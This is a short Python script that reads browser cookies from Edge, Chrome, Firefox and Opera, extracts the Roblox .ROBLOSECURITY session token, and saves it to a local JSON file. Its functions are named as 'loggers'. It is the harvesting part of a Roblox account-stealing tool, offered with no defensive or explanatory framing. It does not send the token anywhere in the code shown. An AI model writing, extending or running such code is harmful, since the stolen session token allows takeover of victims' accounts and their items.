import json
import browser_cookie3
import threading

class RobloxCookie:
    def __init__(self):
        self.cookie_file = 'roblox.json'

    def save_cookies_to_json(self, cookies):
        try:
            with open(self.cookie_file, 'w') as file:
                json.dump({'cookie': cookies}, file)
            print(f'Cookies saved to {self.cookie_file}')
        except Exception as e:
            print(f'Failed to save cookies to JSON: {e}')

    def edge_logger(self):
        try:
            cookies = browser_cookie3.edge(domain_name='roblox.com')
            cookies_str = str(cookies)
            cookie = cookies_str.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            self.save_cookies_to_json(cookie)
        except Exception as e:
            print(f'An error occurred in edge_logger: {e}')

    def chrome_logger(self):
        try:
            cookies = browser_cookie3.chrome(domain_name='roblox.com')
            cookies_str = str(cookies)
            cookie = cookies_str.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            self.save_cookies_to_json(cookie)
        except Exception as e:
            print(f'An error occurred in chrome_logger: {e}')

    def firefox_logger(self):
        try:
            cookies = browser_cookie3.firefox(domain_name='roblox.com')
            cookies_str = str(cookies)
            cookie = cookies_str.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            self.save_cookies_to_json(cookie)
        except Exception as e:
            print(f'An error occurred in firefox_logger: {e}')

    def opera_logger(self):
        try:
            cookies = browser_cookie3.opera(domain_name='roblox.com')
            cookies_str = str(cookies)
            cookie = cookies_str.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            self.save_cookies_to_json(cookie)
        except Exception as e:
            print(f'An error occurred in opera_logger: {e}')

    def run(self):
        # Create and start threads for each browser logger
        threads = [
            threading.Thread(target=self.edge_logger),
            threading.Thread(target=self.chrome_logger),
            threading.Thread(target=self.firefox_logger),
            threading.Thread(target=self.opera_logger)
        ]
        
        for thread in threads:
            thread.start()
        
        for thread in threads:
            thread.join()

if __name__ == "__main__":
    roblox_cookie = RobloxCookie()
    roblox_cookie.run()